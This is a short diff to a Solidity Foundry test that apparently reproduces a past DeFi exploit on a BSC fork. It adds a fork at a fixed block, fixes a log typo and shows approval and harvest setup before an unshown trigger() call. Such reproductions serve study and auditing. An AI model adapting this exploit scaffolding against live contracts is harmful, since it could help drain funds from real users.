@@ -73,12 +73,14 @@ contract ContractTest is DSTest {
     address keeper = 0x793074D9799DC3c6039F8056F1Ba884a73462051;
 
     constructor() public {
+        cheat.createSelectFork("bsc", 7556330);
+
         IERC20(WBNB).approve(address(zap), 1e18);
         IERC20(address(WBNBUSDTv2)).approve(address(flip), type(uint256).max);
         IERC20(address(USDT)).approve(address(router), type(uint256).max);
         IERC20(address(WBNB)).approve(address(router), type(uint256).max);
     }
-
+  
     function testExploit() public {
         payable(WBNB).call{value: 1e18}("");
 
@@ -119,7 +121,7 @@ contract ContractTest is DSTest {
         );
         require(success, "flip.harvest() fails");
 
-        emit log_string("Exploit beings:");
+        emit log_string("Exploit begins:");
 
         trigger();
     }
